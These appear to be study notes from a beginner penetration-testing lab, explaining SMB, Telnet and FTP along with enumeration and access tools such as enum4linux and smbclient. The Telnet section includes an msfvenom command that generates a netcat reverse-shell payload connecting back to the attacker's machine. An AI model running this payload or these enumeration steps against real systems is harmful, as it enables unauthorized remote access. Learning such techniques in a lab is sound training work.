## Understanding SMB

**What is SMB?**

* SMB - ***Server Message Block Protocol*** - is a client-server communication protocol used for sharing access to files, printers, serial ports and other resources on a network.
* <span style="color:#FF0000">The SMB protocol is known as a response-request protocol</span>, meaning that it transmits multiple messages between the client and server to establish a connection. Clients connect to servers using TCP/IP (actually NetBIOS over TCP/IP as specified in RFC1001 and RFC1002), NetBEUI or IPX/SPX.

Once they have established a connection, clients can then send commands (SMBs) to the server that allow them to access shares, open files, read and write files, and generally do all the sort of things that you want to do with a file system. However, in the case of SMB, these things are done over the network.

## Enumerating SMB

**Enumeration**

<span style="color:#FF0000">Enumeration is the process of gathering information on a target</span> in order to find potential attack vectors and aid in exploitation.

This process is essential for an attack to be successful, as wasting time with exploits that either don't work or can crash the system can be a waste of energy. Enumeration can be used to gather usernames, passwords, network information, hostnames, application data, services, or any other information that may be valuable to an attacker.

### Enum4Linux

Enum4linux is a tool used to enumerate SMB shares on both Windows and Linux systems. It is basically a wrapper around the tools in the Samba package and makes it easy to quickly extract information from the target pertaining to SMB. It's installed by default on Parrot and Kali, however if you need to install it, you can do so from the official [github](https://github.com/portcullislabs/enum4linux).

The syntax of Enum4Linux is nice and simple: **"enum4linux [options] ip"**  

**TAG**            **FUNCTION**  

-U             get userlist  
-M             get machine list  
-N             get namelist dump (different from -U and-M)  
-S             get sharelist  
-P             get password policy information  
-G             get group and member list
<span style="color:#FF0000">-a             all of the above (full basic enumeration)</span>

## Exploiting SMB

**SMBClient**

Because we're trying to access an SMB share, we need a client to access resources on servers. We will be using SMBClient because it's part of the default samba suite. While it is available by default on Kali and Parrot, if you do need to install it, you can find the documentation [here.](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)

We can remotely access the SMB share using the syntax:

`smbclient //[IP]/[SHARE]`      
Followed by the tags:

-U [name] : to specify the user

-p [port] : to specify the port 

## Understanding Telnet

**What is Telnet?**

Telnet is an application protocol which allows you, with the use of a telnet client, to connect to and execute commands on a remote machine that's hosting a telnet server.  

The telnet client will establish a connection with the server. The client will then become a virtual terminal- allowing you to interact with the remote host.

<span style="color:#FF0000">Telnet doesn't have encryption</span>

Usage: 

telnet [ip] {port}

## Exploiting Telnet


A **CVE**, short for **C**ommon **V**ulnerabilities and **E**xposures, is a list of publicly disclosed computer security flaws. When someone refers to a CVE, they usually mean the CVE ID number assigned to a security flaw.

### How to start a ICMP listener?
  
Start a tcpdump listener on your local machine.

**If using your own machine with the OpenVPN connection, use:**  

- `sudo tcpdump ip proto \\icmp -i tun0`


We're going to generate a reverse shell payload using msfvenom.This will generate and encode a netcat reverse shell for us. Here's our syntax:
**"msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R"**

##### Switches:`
` -p = payload

`lhost = our local host IP address (this is **your** machine's IP address)

`lport = the port to listen on (this is the port on **your** machine)

`R = export the payload in raw format


  

## Understanding FTP

**What is FTP?**

File Transfer Protocol (FTP) is, as the name suggests , a protocol used to allow remote transfer of files over a network. It uses a client-server model to do this, and- as we'll come on to later- relays commands and data in a very efficient way.  

**How does FTP work?**

A typical FTP session operates using two channels:

- a command (sometimes called the control) channel
- a data channel.

As their names imply, the command channel is used for transmitting commands as well as replies to those commands, while the data channel is used for transferring data.

FTP operates using a client-server protocol. The client initiates a connection with the server, the server validates whatever login credentials are provided and then opens the session.

While the session is open, the client may execute FTP commands on the server.


The FTP server may support either Active or Passive connections, or both. 

- In an **Active FTP** connection, the client opens a port and listens. The server is required to actively connect to it. 
- In a **Passive FTP** connection, the server opens a port and listens (passively) and the client connects to it.
